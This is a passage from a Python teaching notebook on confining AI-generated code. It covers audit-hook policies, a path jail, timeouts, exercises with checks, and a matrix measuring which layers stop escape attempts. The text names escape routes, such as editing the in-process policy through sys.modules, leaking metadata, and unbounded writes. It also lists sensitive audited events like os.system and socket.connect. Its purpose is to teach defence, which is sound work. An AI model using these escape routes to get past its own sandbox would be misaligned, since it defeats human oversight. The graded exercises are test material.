    finally:
        reap_all()
        world.close()
    return {line[5:] for line in run.stderr.splitlines() if line.startswith("\0EVT ")}


def learn_allow_list() -> set[str]:
    """Learning mode: every event name the benign suite raised."""
    seen: set[str] = set()
    for source in BENIGN.values():
        seen |= record_events(source)
    return seen


def allowed_events() -> set[str]:
    if not _ALLOWED:
        _ALLOWED.update(learn_allow_list())
    return _ALLOWED


NOTABLE = ["open", "os.listdir", "os.mkdir", "os.rename", "os.remove", "os.symlink", "os.link",
           "os.system", "os.fork", "os.posix_spawn", "subprocess.Popen", "socket.connect",
           "gc.get_objects", "import", "object.__setattr__"]


def _demo_learning() -> None:
    allowed = allowed_events()
    print(f"python {sys.version.split()[0]}: the benign suite raised {len(allowed)} distinct audited events "
          "(the count depends on your Python)")
    print(f"\n{'event':<18} raised by the benign suite?")
    for event in NOTABLE:
        print(f"{event:<18} {'yes: on the allow-list' if event in allowed else 'no: refused'}")
    if "object.__setattr__" in allowed:
        print("\nLearning mode admits whatever the benign programs did, and a name on the list is not a harmless "
              "operation: object.__setattr__ is on it because a program built a namedtuple. As of 15 October 2026 "
              "the documentation says Python raises that event for certain sensitive attribute assignments, and a "
              "name cannot tell a harmless one from a dangerous one: allowing the name allows every such write, "
              "on every object.")
    print("\nAn import of a module that is already loaded raises no import event at all:")
    for name in ("json", "colorsys"):
        loaded = name in PRELOAD
        raised = "import" in record_events(f"import {name}")
        print(f"  import {name:<9} {'already loaded by the bootstrap' if loaded else 'not loaded yet':<32}"
              f" -> {'an import event' if raised else 'no import event'}")


if _DEMOS:
    _try("learning mode", _demo_learning)

Now write the policy. The jail half is the exercise-2 function, called where it applies.

<details><summary>💡 Hint 1 — what to think about</summary>

The two halves do not depend on each other: each is skipped when its switch is `None`. For each
one, decide what it returns when its condition is met and what happens to the other half then.
Decide too what should happen to an argument that is not a path, to an event whose arguments are
shorter than the position the table names, and to an event that is on neither list.
</details>
<details><summary>💡 Hint 2 — the approach, in words</summary>

Jail half: look the event up in the table of path positions; for each position that exists in
`args`, skip values that are not str, bytes or path-like, and refuse as soon as `inside_jail`
says no. Allow-list half: refuse an unlisted event; for `import`, take the module name's first
dotted part and refuse it unless that part is on the module list. If nothing refused, return
`None` itself, not `False` and not an empty string.
</details>

In [ ]:
def event_verdict(event: str, args: tuple, policy: dict) -> str | None:
    """Decide whether one audited event may go ahead. None allows it; a string refuses it.

    `policy` has "events" (a list of allowed event names, or None), "modules" (top-level package
    names an import may name), "jail" (the jail folder, or None) and "path_args" (event name ->
    positions in `args` that hold paths).

    Example:
        >>> policy = {"events": ["open", "import"], "modules": ["json"], "jail": None, "path_args": {}}
        >>> event_verdict("open", ("notes.txt", "r", 0), policy) is None
        True
        >>> event_verdict("os.system", ("ls",), policy)
        'event os.system is not on the allow-list'
        (the wording is yours; what matters is that it is a non-empty string)

    Returns:
        None to allow, or a non-empty string saying why not.
    """
    # YOUR CODE HERE
    raise NotImplementedError


# Public checks — run these as often as you like.
def _policy(events=None, modules=("json",), jail=None) -> dict:
    return {"events": None if events is None else list(events), "modules": list(modules), "jail": jail,
            "path_args": {event: list(spots) for event, spots in PATH_ARGS.items()}}


def _check_event_verdict_here() -> None:
    listed = _policy(events=["open", "import", "os.listdir"])
    got = event_verdict("open", ("notes.txt", "r", 0), listed)
    assert got is None, f"an event on the allow-list with nothing else wrong must return None itself, got {got!r}"
    got = event_verdict("os.system", ("ls",), listed)
    assert isinstance(got, str) and got, (
        f"got {got!r}: an event that is not on the allow-list is refused with a non-empty string, "
        "whatever its arguments (deny by default, so an event you have never heard of is refused too)"
    )
    got = event_verdict("ctypes.dlopen", ("libc",), listed)
    assert isinstance(got, str) and got, "an unknown event must be refused: the list says what is allowed, not what is not"
    assert event_verdict("os.system", ("ls",), _policy(events=None)) is None, (
        "with policy['events'] set to None the allow-list half is off, and an unlisted event passes"
    )
    for module, expected in (("json", None), ("json.decoder", None), ("json.decoder.scanner", None),
                             ("subprocess", "refuse"), ("jsonx", "refuse"), ("os.path", "refuse")):
        got = event_verdict("import", (module, None, [], [], []), listed)
        assert (got is None) == (expected is None), (
            f"import of {module!r}: got {got!r}. The module name is dotted: judge its top-level package "
            "(the part before the first dot), as a whole name, not as a prefix of characters"
        )
    top, jail, _ = _jail_tree()
    try:
        confined = _policy(events=None, jail=jail)
        inside, outside = os.path.join(jail, "notes.txt"), os.path.join(top, "outside", "secret.txt")
        assert event_verdict("open", (inside, "r", 0), confined) is None, "a path inside the jail must pass"
        got = event_verdict("open", (outside, "r", 0), confined)
        assert isinstance(got, str) and got, f"got {got!r}: a path outside the jail must be refused"
        assert event_verdict("open", (3, "r", 0), confined) is None, (
            "an integer is a file descriptor, not a path: it cannot be judged, so it is not refused"
        )
        got = event_verdict("os.rename", (inside, outside, -1, -1), confined)
        assert isinstance(got, str) and got, (
            f"got {got!r}: os.rename names two paths, and the second one leads out of the jail; "
            "check every position the table lists, not only the first"
        )
        got = event_verdict("os.rename", (outside, inside, -1, -1), confined)
        assert isinstance(got, str) and got, "the first path of os.rename leads out of the jail"
        assert event_verdict("os.system", ("ls",), confined) is None, (
            "the jail half judges only the events in policy['path_args']; with the allow-list half off, "
            "an event it does not list passes"
        )
        assert event_verdict("os.listdir", (os.path.join(jail, "sub"),), _policy(events=["os.listdir"], jail=jail)) is None, (
            "a listed event whose path is inside the jail is allowed: return None itself"
        )
        both = _policy(events=["os.listdir"], jail=jail)
        assert isinstance(event_verdict("os.listdir", (top,), both), str), (
            "both halves are on: a listed event whose path leads out is still refused"
        )
        assert isinstance(event_verdict("os.mkdir", (os.path.join(jail, "x"),), both), str), (
            "both halves are on: an event inside the jail that is not on the allow-list is still refused"
        )
        assert event_verdict("os.rename", (inside,), confined) is None, (
            "an event with fewer arguments than the table names must not crash; judge what is there"
        )
    finally:
        shutil.rmtree(top, ignore_errors=True)


def _check_event_verdict_in_child() -> None:
    """The same two functions, shipped to a child process on their own, as the matrix below ships them."""
    both = frozenset({"audit", "jail"})
    ok = [name for name in BENIGN if run_benign(name, both)]
    assert len(ok) == len(BENIGN), (
        f"only {len(ok)} of {len(BENIGN)} benign programs ran behind the audit and jail layers "
        f"(failed: {sorted(set(BENIGN) - set(ok))}). Your two functions run alone in the child: use only os, sys, re, "
        "pathlib, Path and inside_jail, no default values and no names from this notebook (PATH_ARGS, PRELOAD, "
        "your own helpers); and a path inside the jail must be allowed"
    )
    attempt = ATTACKS[0]
    assert not run_attempt(attempt, both), (
        f"attempt {attempt.id} ({attempt.name}) reached its goal behind the audit and jail layers: in the child, "
        "the policy has to refuse a path outside the jail"
    )


def _check_event_verdict() -> None:
    with _time_limit(3, "exercise 3"):         # the calls above, made in this process
        _check_event_verdict_here()
    _check_event_verdict_in_child()            # and the same functions in a real child
    print("exercise 3 looks right")


_try("exercise 3", _check_event_verdict)

In [ ]:
# The audit layer alone, in the child: the benign programs still run, an os.system attempt does
# not, and a plain read of the planted secret goes straight through (open is on the list).
def _demo_audit_layer() -> None:
    alone = frozenset({"audit"})
    ok = sum(run_benign(name, alone) for name in BENIGN)
    print(f"benign programs that still run behind the audit layer: {ok} of {len(BENIGN)}")
    for number in (11, 1):
        attempt = ATTACKS[number - 1]
        got = run_attempt(attempt, alone)
        print(f"{number:>2} {attempt.name:<24} {'reaches its goal' if got else 'stopped'}")


if _DEMOS:
    _try("audit layer", _demo_audit_layer, needs=("exercise 3",))


# The import rule, measured: four imports behind the audit layer alone, each decided by something else.
def _demo_imports() -> None:
    audit = frozenset({"audit"})
    cases = (("json", "already loaded by the bootstrap", "import json\nprint('ran')"),
             ("helper", "written by the program, on the list", BENIGN["own module"]),
             ("colorsys", "not loaded, not on the list", "import colorsys\nprint('ran')"),
             ("subprocess", "not loaded, not on the list", "import subprocess\nprint('ran')"))
    print(f"{'import':<11} {'what the module is':<36} behind the audit layer")
    for name, what, source in cases:
        world = World(0)
        try:
            run = execute(source, audit, world)
        finally:
            reap_all()
            world.close()
        said = (run.stderr.strip().splitlines() or ["?"])[-1][:72]
        print(f"{name:<11} {what:<36} {'runs' if run.returncode == 0 else 'refused: ' + said}")


if _DEMOS:
    _try("import rule", _demo_imports, needs=("exercise 3",))

## 6. The matrix: what each layer stops, alone and together

Three layers make eight combinations, counting the empty one, which is the control. The cell
below runs every attempt against every combination in a fresh arena each time, and runs the
benign suite against every combination too. It uses **your** three functions: your supervisor
whenever T is on, your policy whenever A or J is on. It starts a fresh child for every attempt and
every combination, and gives the loop and the daemon the time they need to show themselves.

Name a combination by its layers' letters: **A** audit, **T** timeout, **J** jail; `none` is the
control. In the table `X` means the attempt reached its goal and `.` means it did not. Read the
`none` column first: it says which attempts work at all.

In [ ]:
CONFIGS = [frozenset(combo) for size in range(len(LAYERS) + 1)
           for combo in itertools.combinations(LAYERS, size)]


assert len(CONFIGS) == 8 and len(LAYERS) == 3               # the prose says three layers, eight combinations


def label(config) -> str:
    """The letters of the layers in `config`, in a fixed order; "none" for the control."""
    return "".join(LETTER[layer] for layer in LAYERS if layer in config) or "none"


REACHED: dict[tuple[int, frozenset], bool] = {}   # (attempt id, layers) -> did it reach its goal?
BENIGN_OK: dict[frozenset, int] = {}               # layers -> how many benign programs still ran


def measure_matrix() -> None:
    REACHED.clear()
    BENIGN_OK.clear()
    for config in CONFIGS:
        for attempt in ATTACKS:
            REACHED[(attempt.id, config)] = run_attempt(attempt, config)
        BENIGN_OK[config] = sum(run_benign(name, config) for name in BENIGN)


def print_matrix(reached: dict, benign_ok: dict) -> None:
    print(f"{'#':>2}  {'attempt':<40}" + "".join(f"{label(c):>5}" for c in CONFIGS))
    for attempt in ATTACKS:
        print(f"{attempt.id:>2}  {attempt.name:<40}"
              + "".join(f"{'X' if reached[(attempt.id, c)] else '.':>5}" for c in CONFIGS))
    print(f"{'':>2}  {'attempts that reached their goal':<40}"
          + "".join(f"{sum(reached[(a.id, c)] for a in ATTACKS):>5}" for c in CONFIGS))
    print(f"{'':>2}  {'benign programs that still run':<40}" + "".join(f"{benign_ok[c]:>5}" for c in CONFIGS))
    print(f"\nX = reached its goal, . = did not; the benign row counts programs out of {len(BENIGN)}.")


def _demo_matrix() -> None:
    measure_matrix()
    print_matrix(REACHED, BENIGN_OK)
    broken = [label(c) for c in CONFIGS if BENIGN_OK[c] < len(BENIGN)]
    assert not broken, (
        f"behind {', '.join(broken)} some benign programs no longer run (the benign row above), so this table credits "
        "layers with stops that come from refusing ordinary work, and the cells that read it are withheld. The "
        "functions you wrote run alone in the child: read what exercises 1 and 3 print, fix them, and run this cell again"
    )


def _matrix_readable() -> bool:
    """False, with the reason printed, when the matrix is missing or was measured on a sandbox that stops everything."""
    if not REACHED:
        print("the matrix has not been measured yet: run the cell that measures it, then this one")
        return False
    broken = [label(c) for c in CONFIGS if BENIGN_OK[c] < len(BENIGN)]
    if broken:
        print(f"no conclusions from this matrix: behind {', '.join(broken)} some benign programs no longer run, "
              "so its stops are not defences. Fix the functions the matrix cell complained about and run it again.")
        return False
    return True


if _DEMOS:
    _try("matrix", _demo_matrix, needs=("exercise 1", "exercise 2", "exercise 3"))


# One column needs care. Importing a module that Python has not loaded yet opens that module's file in the
# interpreter's library folder, which is outside the jail, and a few of the attempts import something (or call
# something that imports) before they do anything else. Which of the jail's stops are of that kind? The child's
# error says: a refusal that happens while Python is importing passes through its import machinery.
IMPORT_STOPS: set[int] = set()


def _demo_library_reads() -> None:
    if not _matrix_readable():
        return
    jail = frozenset({"jail"})
    stopped = [a for a in ATTACKS if REACHED[(a.id, frozenset())] and not REACHED[(a.id, jail)]]
    found = []
    for attempt in stopped:
        seen: dict = {}
        run_attempt(attempt, jail, keep=seen)
        if "importlib._bootstrap" in seen["run"].stderr:
            found.append(attempt.id)
    IMPORT_STOPS.clear()
    IMPORT_STOPS.update(found)
    print(f"the jail stops {len(stopped)} attempts on its own. Run them again and read the child's error: "
          f"{len(found)} of them were stopped while Python was importing a module.")
    if found:
        print(f"those attempts: {', '.join(map(str, found))}")
        print("Python had to read a file from its own library folder, which is outside the jail, and the jail "
              "refused. That is a stop, but not a judgement about the attempt.\nThey are marked * in the table "
              "of critical layers below. Read the jail's counts with that in mind.")


if _DEMOS:
    _try("library reads", _demo_library_reads, needs=("exercise 1", "exercise 2", "exercise 3"))

## 7. Exercise 4 — `stopped_by()`

A `.` in the table is not yet "stopped". An attempt that never worked (a typo, a platform
difference, a canary planted in the wrong place) shows `.` in every column, and counting it
would credit every layer with a stop it did not make. That is why the control exists. An attempt
is **stopped by** a combination only if it reached its goal against the control and did not
against that combination.

`reached` maps `(attempt_id, layers)` to `True` when the attempt reached its goal against that
combination of layers, where `layers` is a `frozenset` of layer names; the control is the empty
set. Every attempt has an entry for every combination you will be asked about.

<details><summary>💡 Hint 1 — what to think about</summary>

Which entries of `reached` say that an attempt works at all? Which one says that it was defeated?
What should happen to an attempt that is `False` in both? And in what order should the ids come
back?
</details>
<details><summary>💡 Hint 2 — the approach, in words</summary>

Collect the attempt ids from the keys. Keep an id when its entry for the empty set is true and
its entry for `config` is false. Return the kept ids as a list in ascending order.
</details>

In [ ]:
def stopped_by(reached: Mapping[tuple[int, frozenset], bool], config: frozenset) -> list[int]:
    """The ids of the attempts that `config` stops: they work against the control and not against it.

    `reached[(attempt_id, layers)]` is True when the attempt reached its goal against `layers`;
    `frozenset()` is the control.

    Example:
        >>> none, a = frozenset(), frozenset({"audit"})
        >>> reached = {(1, none): True, (2, none): True, (3, none): False,
        ...            (1, a): False, (2, a): True, (3, a): False}
        >>> stopped_by(reached, a)
        [1]
        (attempt 2 got through; attempt 3 never worked, so nothing can be said to have stopped it)

    Returns:
        the ids, ascending.
    """
    # YOUR CODE HERE
    raise NotImplementedError


# Public checks — run these as often as you like.
def _check_stopped_by() -> None:
    none, a, b = frozenset(), frozenset({"a"}), frozenset({"a", "b"})
    reached = {(7, none): True, (7, a): False, (7, b): False,
               (3, none): True, (3, a): True, (3, b): False,
               (5, none): False, (5, a): False, (5, b): False,
               (1, none): True, (1, a): False, (1, b): True}
    got = stopped_by(reached, a)
    assert 5 not in got, (
        f"got {got}: attempt 5 never reached its goal, not even against the control, so nothing stopped it: "
        "an attempt only counts as stopped if it worked when nothing defended"
    )
    assert sorted(got) == [1, 7], f"got {got}: attempts 7 and 1 work against the control and fail against {{'a'}}"
    assert got == [1, 7], f"got {got}: return the ids in ascending order"
    assert stopped_by(reached, b) == [3, 7], f"got {stopped_by(reached, b)}: attempt 1 gets through {{'a', 'b'}}"
    assert stopped_by(reached, none) == [], "the control stops nothing"
    assert isinstance(got, list), "return a list"
    print("exercise 4 looks right")


_try("exercise 4", _check_stopped_by)

In [ ]:
# Counts per combination, from YOUR stopped_by. A count says how many; not which, and not how bad.
def _demo_stopped() -> None:
    if not _matrix_readable():
        return
    works = [a.id for a in ATTACKS if REACHED[(a.id, frozenset())]]
    print(f"{len(works)} of {len(ATTACKS)} attempts work against the undefended child; only those can be stopped.\n")
    print(f"{'layers':<8} {'attempts stopped':>17}   benign programs still running")
    for config in CONFIGS[1:]:
        print(f"{label(config):<8} {len(stopped_by(REACHED, config)):>17}   {BENIGN_OK[config]} of {len(BENIGN)}")
    if IMPORT_STOPS:
        print(f"\n{len(IMPORT_STOPS)} of the jail's {len(stopped_by(REACHED, frozenset({'jail'})))} stops (row J) were made "
              "while Python was importing a module, measured above, not on a path the attempt chose.")


if _DEMOS:
    _try("stopped counts", _demo_stopped, needs=("exercise 1", "exercise 2", "exercise 3", "exercise 4"))

## 8. Exercise 5 — `critical_layers()`

The counts above rank the layers by what each stops *alone*. That is not what a layer is worth
once the others are there: an attempt that the allow-list and the jail both stop is stopped twice,
and taking either away costs nothing. The honest question for each attempt that the full stack
stops is: **which layers is it relying on?** A layer is **critical** for an attempt if the attempt
reaches its goal once that layer, and only that layer, is taken out of the full stack.

`critical_layers(reached, full)` returns a dictionary with one entry for each attempt that `full`
stops (in the sense of exercise 4): the key is the attempt id and the value is the `frozenset` of
layers that are critical for it. An empty set means the attempt is covered by more than one layer.
Attempts that `full` does not stop are not in the dictionary.

<details><summary>💡 Hint 1 — what to think about</summary>

You already have a function that says which attempts a stack stops. For each layer, what is the
stack with that layer removed, and which entry of `reached` says whether the attempt gets back in?
</details>
<details><summary>💡 Hint 2 — the approach, in words</summary>

For every attempt that `stopped_by` reports for `full`, go through the layers of `full`, form the
set without that layer, and collect the layers for which `reached` says the attempt reaches its
goal. Store the collected layers as a `frozenset`, even when there are none.
</details>

In [ ]:
def critical_layers(reached: Mapping[tuple[int, frozenset], bool], full: frozenset) -> dict[int, frozenset]:
    """For each attempt that `full` stops, the layers it relies on: the ones whose removal lets it in.

    Example:
        >>> none, ab, a, b = frozenset(), frozenset({"a", "b"}), frozenset({"a"}), frozenset({"b"})
        >>> reached = {(1, none): True, (1, ab): False, (1, a): False, (1, b): True,
        ...            (2, none): True, (2, ab): False, (2, a): False, (2, b): False}
        >>> critical_layers(reached, ab) == {1: frozenset({"a"}), 2: frozenset()}
        True
        (attempt 1 gets back in without layer "a"; attempt 2 is covered by both layers)

    Returns:
        {attempt id: frozenset of layer names}, for the attempts `full` stops.
    """
    # YOUR CODE HERE
    raise NotImplementedError


# Public checks — run these as often as you like.
def _check_critical_layers() -> None:
    none, ab, a, b = frozenset(), frozenset({"a", "b"}), frozenset({"a"}), frozenset({"b"})
    reached = {(1, none): True, (1, ab): False, (1, a): False, (1, b): True,
               (2, none): True, (2, ab): False, (2, a): False, (2, b): False,
               (3, none): True, (3, ab): True, (3, a): True, (3, b): True,
               (4, none): True, (4, ab): False, (4, a): True, (4, b): True,
               (5, none): False, (5, ab): False, (5, a): False, (5, b): False}
    got = critical_layers(reached, ab)
    assert set(got) == {1, 2, 4}, (
        f"got attempts {sorted(got)}: the dictionary has an entry for each attempt the full stack stops "
        "(1, 2 and 4); 3 gets through, and 5 never worked"
    )
    assert got[1] == frozenset({"a"}), f"attempt 1 gets back in once 'a' is removed: critical = {{'a'}}, got {set(got[1])}"
    assert got[2] == frozenset(), (
        f"attempt 2 stays stopped when either layer is removed, so no layer is critical: "
        f"expected an empty frozenset, got {got[2]!r}"
    )
    assert got[4] == frozenset({"a", "b"}), f"attempt 4 needs both layers, got {set(got[4])}"
    assert all(isinstance(v, frozenset) for v in got.values()), "store each value as a frozenset, even an empty one"
    print("exercise 5 looks right")


_try("exercise 5", _check_critical_layers, needs=("exercise 4",))

In [ ]:
# What each layer is worth, alone and once the others are there. Computed from YOUR two functions.
def _demo_critical() -> None:
    if not _matrix_readable():
        return
    full = frozenset(LAYERS)
    critical = critical_layers(REACHED, full)
    names = {a.id: a.name for a in ATTACKS}
    print(f"the full stack ({label(full)}) stops {len(critical)} of {len(ATTACKS)} attempts. What each one relies on:\n")
    for attempt_id, layers in critical.items():
        needs = ", ".join(layer for layer in LAYERS if layer in layers) or "(covered by more than one layer)"
        print(f"{attempt_id:>2} {names[attempt_id]:<42} {needs}{' *' if attempt_id in IMPORT_STOPS else ''}")
    if IMPORT_STOPS:
        print("* one of the layers covering it is the jail, and only through a refusal made while Python was importing")
    print(f"\n{'layer':<9} {'stops alone':>11} {'lost if removed from the full stack':>37}")
    for layer in LAYERS:
        alone = len(stopped_by(REACHED, frozenset({layer})))
        lost = sum(layer in layers for layers in critical.values())
        print(f"{layer:<9} {alone:>11} {lost:>37}")
    redundant = sum(not layers for layers in critical.values())
    print(f"\n{redundant} attempts are stopped by the full stack without any single layer being critical.")


if _DEMOS:
    _try("critical layers", _demo_critical, needs=("exercise 1", "exercise 2", "exercise 3", "exercise 4", "exercise 5"))

## 9. What got through, one route closed, and what this is not

The last column of the matrix is the one that matters: the attempts that reached their goal
against all three layers. The cell below lists them from your matrix and says, for each, why no
layer here could have stopped it. Three reasons recur, and each points somewhere else for the
fix: an operation that raises **no audited event** (so no policy can see it), an action that
is **allowed on purpose** and has no bound, and **state the policy keeps where the generated
code can reach it**.

The third is a defect of this bootstrap, not of a layer, and one route to it is easy to close:
the same lines, wrapped in a function, keep their names in a function's scope instead of in the
module the child runs as `__main__`. The second cell measures the full stack again with the lines
wrapped. That closes the route attempt 18 takes, not the class of route. The policy lives in the
process it guards, so it stays reachable through anything the generated code can introspect
(frames, the garbage collector, modules), and the learned allow-list admits whatever the benign
programs did, `object.__setattr__` among it. Which introspection events are on your list depends
on those programs and on your Python: run the suite again after every change.

In [ ]:
WHY_IT_GETS_THROUGH = {
    9: "asking a file's size raises no audited event, so no policy can see it: a leak of metadata, not contents",
    18: "the policy dictionary sits in the module the child runs as __main__, which generated code can reach "
        "through sys.modules; changing a dictionary raises no audited event",
    20: "writing inside the jail is allowed on purpose, and nothing here bounds how much",
}


def _demo_through() -> None:
    if not _matrix_readable():
        return
    full = frozenset(LAYERS)
    through = [a for a in ATTACKS if REACHED[(a.id, full)] and REACHED[(a.id, frozenset())]]
    print(f"{len(through)} of {len(ATTACKS)} attempts reach their goal against {label(full)}:\n")
    for attempt in through:
        print(f"{attempt.id:>2} {attempt.name}\n     {WHY_IT_GETS_THROUGH.get(attempt.id, 'see its row in the matrix')}")


if _DEMOS:
    _try("what got through", _demo_through, needs=("exercise 1", "exercise 2", "exercise 3"))


def _demo_hardened() -> None:
    if not _matrix_readable():
        return
    full = frozenset(LAYERS)
    repaired = {(a.id, full): run_attempt(a, full, hardened=True) for a in ATTACKS}
    changed = [a for a in ATTACKS if repaired[(a.id, full)] != REACHED[(a.id, full)]]
    for attempt in changed:
        now = "reaches its goal" if repaired[(attempt.id, full)] else "is stopped"
        print(f"{attempt.id:>2} {attempt.name}: with the hardened layout it {now}")
    if not changed:
        print("no attempt changed its outcome with the hardened layout")
    merged = {**REACHED, **repaired}
    closes = "That closes the route those attempts take, not the class of routes. " if changed else ""
    print(f"\nthe full stack with the hardened layout stops {len(stopped_by(merged, full))} of {len(ATTACKS)} attempts "
          f"(before: {len(stopped_by(REACHED, full))}). {closes}The attempts nobody has written are not in these counts.")


if _DEMOS:
    _try("hardened layout", _demo_hardened, needs=("exercise 1", "exercise 2", "exercise 3", "exercise 4"))

### What this is not

As of 15 October 2026 the Python documentation says of audit hooks that they are not suitable for
implementing a sandbox, and that malicious code can trivially disable or bypass them. PEP 578,
which introduced them, says that sandboxing CPython has been attempted many times and each attempt
failed; it does not try to restrict functionality, but exposes the fact that it is being used,
because for intrusion scenarios detection matters more than early prevention. You have just seen
the reasons in your own table: the hook runs in the process it guards,
some operations raise no event, and a policy that allows what a benign workload needs also allows
what an attacker needs, with different arguments.

So treat what you built as one layer *inside* a boundary that something else enforces:

* **a container or a microVM** for the file system, the process table and the kernel surface;
* **an egress allow-list** at the network edge, not a policy inside the program;
* **quotas and limits** for disk, memory, processes and CPU. This lesson sets none of them, so
  that its counts do not depend on which limits your system enforces: as of 15 October 2026 the
  `resource` module notes that not all systems use the same symbol or value for the same resource,
  and does not mask the difference. A real tool sets them; `RLIMIT_FSIZE`, a cap on the size of
  a file the process may create, would bound attempt 20;
* **secrets injected for one call** and never left in an environment the code can read.

What carries over is the method: a positive control, an escape suite that you keep running, and a
table that says what each layer is worth next to a benign suite that says what it costs.

## 10. Common mistakes

* **Counting an attempt that never worked as stopped.** Without the control column, a typo in an
  attempt looks like a defence. Exercise 4 exists for this.
* **Stopping the child and calling it done.** `proc.kill()` leaves what the child started, and a
  child that exits can leave a daemon: the group is signalled on every path out. A process that
  has left the group is out of reach of that signal, so never wait for ever on its pipes.
* **Judging a path by its spelling.** Prefix tests, `..`, links and the root itself being reached
  through a link each defeat them; resolve both sides before comparing.
* **An allow-list of names that stops at the names.** `open` has to be allowed, so the arguments
  have to be judged too. And a list typed from memory, or a deny-list, lets through the event you
  did not know existed.
* **Reading the counts as safety.** A count treats a loop and a leaked secret alike, and says
  nothing about attempts nobody wrote. Keep the benign row beside it, and keep adding attempts.
* **Trusting a guard that lives in the thing it guards.** If the generated code can reach the
  policy, it can change it.
* **Leaving children behind.** Anything that starts processes in a test needs a clean-up that runs
  whatever the code under test did. `reap_all()` is this lesson's.

In [ ]:
_MARKS = {"passed": "✅", "failed": "❌", "not started": "⏳"}


def _progress_board() -> None:
    width = max(len(", ".join(funcs)) for funcs in _EXERCISES.values())
    print("progress board")
    for label_, funcs in _EXERCISES.items():
        state = _STATUS.get(label_, "not started")
        print(f"  {_MARKS[state]} {label_:<12} {', '.join(funcs):<{width}}  {state}")
    done = sum(_STATUS.get(name) == "passed" for name in _EXERCISES)
    print(f"\n{done} of {len(_EXERCISES)} exercises complete")
    failing = [name for name in _EXERCISES if _STATUS.get(name) == "failed"]
    if failing:
        print("failing right now: " + ", ".join(failing) + ". Each one printed what went "
              "wrong in its own cell above, and every exercise has hints you can open.")
    elif done < len(_EXERCISES):
        print("work top to bottom: every exercise has hints you can open above its code.")
    others = [name for name in dict.fromkeys(_FAILED_CHECKS) if name not in _EXERCISES]
    if others:
        print("also failed above: " + ", ".join(others) + ". The cell printed why.")

## 11. Self-check

1. A policy allows the audited event `open`, because the benign programs open files. What follows?
   - (a) It still refuses a read of a file outside the jail, because an allow-list of event names also judges the path
   - (b) It cannot tell opening a file in the jail from opening one outside, so the path argument must be checked too
   - (c) Nothing follows from it, because opening a file is harmless: reading never lets anything out of the machine
   - (d) The benign programs will fail anyway, since no program can start without importing modules, which is refused

2. A supervisor calls `proc.kill()` when the time limit passes. The child had started a helper that
   inherited the child's output pipes. What happens?
   - (a) The helper ends with the child, because the operating system stops every process whose parent has ended
   - (b) The helper ends, but the supervisor's read of the child's output fails with an error as the pipes are cut
   - (c) The helper is signalled by the operating system as soon as the child that opened the pipes has been killed
   - (d) The helper keeps running, and while it holds the pipes open the supervisor's read can keep waiting for it

3. In a results table one escape attempt shows "did not reach its goal" against every combination
   of layers, the undefended control included. A report says every layer stops it. What is wrong?
   - (a) No layer can be credited: it never worked against the control, so the attempt needs fixing before it counts
   - (b) Nothing is wrong: a layer that stops an attempt in every combination is exactly what a good layer does
   - (c) The control should have been left out of the table, because it only shows what happens with no defence at all
   - (d) The attempt should be run again against more layers, until some combination lets it reach its goal

4. Suppose layer J stops more attempts alone than layer T does. What can you conclude?
   - (a) J is worth more than T in any stack, because the count of attempts it stops alone is the larger one
   - (b) T can be dropped from the stack, since a layer that stops fewer attempts alone adds nothing to the others
   - (c) Not that: a count weighs every attempt alike and hides overlap, so compare what each layer adds to the others
   - (d) The benign suite is no longer needed, because the counts already show which of the two layers is better

5. Why is an audit hook, however careful its policy, not a security boundary?
   - (a) Because Python calls the hook too slowly for its refusals to matter once a program has run for a while
   - (b) Because the generated code runs in the same process and can reach what it guards, and some operations raise no event
   - (c) Because a hook can only write down what happened, never refuse an operation, so every operation goes ahead
   - (d) Because an allow-list that is longer than the deny-list it replaces is always the weaker of the two

<details><summary>Answers</summary>

Answers come with this lesson's worked solution when you enrol on Synapsa.
</details>

## What you built, and where it goes next

`supervise` makes a time limit mean something for programs that start programs; `inside_jail`
answers "is this path in the folder?" the way the operating system would; `event_verdict` turns a
recorded workload into a deny-by-default policy and judges the arguments the names cannot;
`stopped_by` and `critical_layers` turn eight combinations of twenty-one attempts into what each
layer stops and what it adds. The loop of T07-L01 can now run the one tool that executes
generated Python in a supervised, audited child process, and say in a table what each layer of
that is worth. Left out on purpose: containers, microVMs and egress proxies, resource limits,
timing races and cost per sandbox-second.

In [ ]:
# Your progress board. Every check is re-run here, quietly, against your code as it stands
# now — each one already printed its feedback in its own cell above — so the board is
# current even if you edited an exercise and did not re-run its check.
if __name__ == "__main__":
    _ALL_CHECKS = (
        ("exercise 1", _check_supervise, ()),
        ("exercise 2", _check_inside_jail, ()),
        ("exercise 3", _check_event_verdict, ()),
        ("exercise 4", _check_stopped_by, ()),
        ("exercise 5", _check_critical_layers, ("exercise 4",)),
    )
    with contextlib.redirect_stdout(io.StringIO()):
        for _name, _check, _needs in _ALL_CHECKS:
            _try(_name, _check, needs=_needs)
    reap_all()
    _progress_board()
    # A stub you have not reached yet is not a failure. A check that ran and came back wrong
    # is: in a script or under CI it ends this run non-zero. Inside a notebook kernel the
    # board above has already said so, in a line rather than a traceback.
    if _FAILED_CHECKS and "ipykernel" not in sys.modules:
        raise SystemExit("checks failed: " + ", ".join(dict.fromkeys(_FAILED_CHECKS)))

<!-- COMMONS NOTICE v1 · generated by tools/notebooks.py · do not edit by hand -->
---
**Synapsa Commons** · © 2026 RealAI · licensed under [CC BY-NC-SA
4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/)

**You may** use this lesson to learn and to teach, and copy, fork, share and adapt it.

**You must** credit "Synapsa Commons by RealAI" with a link to
https://github.com/TarrySingh/Artificial-Intelligence-Deep-Learning-Machine-Learning-Tutorials,
say what you changed, and share anything you adapt under this same licence.

**You may not** use it, or anything adapted from it, in a way primarily intended for
commercial advantage or payment: for example selling it, charging for a course, bootcamp or
training built on it, or packaging it into a paid product or service. For a commercial
licence, contact [RealAI](https://www.realai.eu/contact).

Third-party material in this lesson keeps its own licence, named in `assets/SOURCE.md` or
`claims.yaml`. The Synapsa name and logo belong to RealAI and are not licensed. This summary
is not the licence: the [legal
code](https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode) governs.